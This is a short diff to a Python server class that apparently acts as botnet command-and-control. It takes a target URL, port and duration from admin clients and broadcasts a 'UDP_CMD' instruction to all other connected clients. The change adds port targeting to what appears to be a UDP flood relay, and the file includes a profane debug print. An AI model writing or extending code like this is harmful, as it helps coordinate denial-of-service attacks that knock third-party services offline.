@@ -93,11 +93,12 @@ class Server:
                         print("PIZDA?")
                         print(message)
                         url = message.split(':')[1]
-                        sec = message.split(':')[2]
+                        sec = message.split(':')[3]
+                        port = message.split(':')[2]
                         print(url)
                         for c in self.clients:
                             if not (c in self.admins):
-                                c.sendall(f"{UDP_CMD}:{url}:{sec}".encode())
+                                c.sendall(f"{UDP_CMD}:{url}:{port}:{sec}".encode())
                     else:
                         print(f"Received message: {message}")
                         # Send message to all clients if sender is an admin
